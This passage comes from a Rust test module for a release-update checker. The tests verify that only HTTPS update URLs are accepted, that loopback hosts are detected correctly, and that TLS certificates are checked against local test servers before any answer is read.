        assert!(e.contains("too long") || e.contains("closed"), "{e}");
    }

    #[test]
    fn plain_http_is_accepted_only_for_loopback_and_only_for_the_check_url() {
        for url in [
            "http://example.com/x",
            "http://api.github.com/repos/Sparkz400/network-scope/releases/latest",
            "http://192.0.2.1/x",
        ] {
            assert_eq!(
                check_at(url, "0.5.1", TIMEOUT).unwrap_err(),
                "update checks use https"
            );
        }
        for url in ["ftp://x/y", "", "https://u:p@x/", "https://x y/"] {
            assert!(check_at(url, "0.5.1", TIMEOUT).is_err(), "{url}");
        }
        assert!(is_loopback("127.0.0.1") && is_loopback("::1") && is_loopback("localhost"));
        assert!(!is_loopback("127.0.0.1.example.com") && !is_loopback("10.0.0.1"));
        assert!(LATEST_URL.starts_with("https://api.github.com/repos/"));
        assert!(LATEST_URL.contains(REPO));
    }

    // The macOS verifier has strict rules for test certificates (see notify.rs); the other
    // platforms check the whole path: TLS handshake with an injected test root, then the answer.
    #[cfg(not(target_vendor = "apple"))]
    #[test]
    fn https_answers_are_read_after_the_certificate_is_verified() {
        use crate::notify::tests::{test_pki, trusting};
        let (ca, cert, key) = test_pki("127.0.0.1");
        let provider = Arc::new(rustls::crypto::ring::default_provider());
        let config = rustls::ServerConfig::builder_with_provider(provider)
            .with_safe_default_protocol_versions()
            .unwrap()
            .with_no_client_auth()
            .with_single_cert(vec![cert], key)
            .unwrap();
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        let server = std::thread::spawn(move || {
            let (tcp, _) = listener.accept().unwrap();
            tcp.set_read_timeout(Some(Duration::from_secs(5))).unwrap();
            let conn = rustls::ServerConnection::new(Arc::new(config)).unwrap();
            let mut tls = rustls::StreamOwned::new(conn, tcp);
            let mut buf = [0u8; 1024];
            let _ = tls.read(&mut buf);
            let _ = tls.write_all(&ok(FIXTURE));
            let _ = tls.flush();
        });
        let url = format!("https://127.0.0.1:{port}/repos/x/y/releases/latest");
        let outcome = check_with(&url, "0.5.1", TIMEOUT, &trusting(&ca)).unwrap();
        server.join().unwrap();
        assert!(matches!(outcome, Outcome::Available(_)), "{outcome:?}");
    }

    #[test]
    fn an_untrusted_certificate_is_rejected_and_nothing_is_read() {
        use crate::notify::tests::test_pki;
        let (_ca, cert, key) = test_pki("127.0.0.1");
        let provider = Arc::new(rustls::crypto::ring::default_provider());
        let config = rustls::ServerConfig::builder_with_provider(provider)
            .with_safe_default_protocol_versions()
            .unwrap()
            .with_no_client_auth()
            .with_single_cert(vec![cert], key)
            .unwrap();
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        let server = std::thread::spawn(move || {
            let (tcp, _) = listener.accept().unwrap();
            tcp.set_read_timeout(Some(Duration::from_secs(5))).unwrap();
            let conn = rustls::ServerConnection::new(Arc::new(config)).unwrap();
            let mut tls = rustls::StreamOwned::new(conn, tcp);
            let mut buf = [0u8; 1024];
            // The client must abort the handshake, so no request ever arrives.
            tls.read(&mut buf).unwrap_or(0)
        });
        let url = format!("https://127.0.0.1:{port}/x");
        let e = check_at(&url, "0.5.1", TIMEOUT).unwrap_err();
        assert!(e.contains("certificate") || e.contains("handshake"), "{e}");
        assert_eq!(server.join().unwrap(), 0);
    }
}
